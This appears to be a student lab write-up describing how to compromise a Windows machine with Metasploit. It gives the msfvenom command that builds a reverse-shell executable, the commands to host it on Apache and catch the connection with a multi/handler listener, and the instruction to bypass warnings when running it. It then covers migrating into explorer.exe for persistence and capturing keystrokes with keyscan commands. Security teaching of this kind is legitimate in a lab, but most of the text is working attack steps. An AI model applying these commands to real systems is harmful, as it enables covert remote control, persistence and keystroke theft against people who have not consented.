Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
Find the attackers ip address using ifconfig

Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe

## OUTPUT

Start apache server
sudo systemctl apache2 start

Check the status of apache2

Starting a command and control Server

use multi/handler

set PAYLOAD windows/meterpreter/reverse_tcp

set LHOST 0.0.0.0

exploit

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:

http://192.168.1.2/fun.exe

The file "fun.exe" downloads.

Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit

To see a list of processes, at the meterpreter > prompt, execute this command:
ps  â‡’ can see the fun.exe process running with pid 1156

![image](https://github.com/user-attachments/assets/9338ac5d-3d47-4b7a-8ae2-f790ffa2635f)

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.

To become more persistent, we'll migrate to a process that will last longer.

Let's migrate to the winlogon process.

At the meterpreter > prompt, execute this command:

migrate -N explorer.exe

at meterpreter > prompt, execute this command:

netstat

A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.

Notice the "PID/Program name" value for this connection, which is redacted

Post Exploitation

The target is now owned. Following are meterpreter commands for key capturing in the target machine

keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

keyscan_dump	Shows the keystrokes captured so far

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
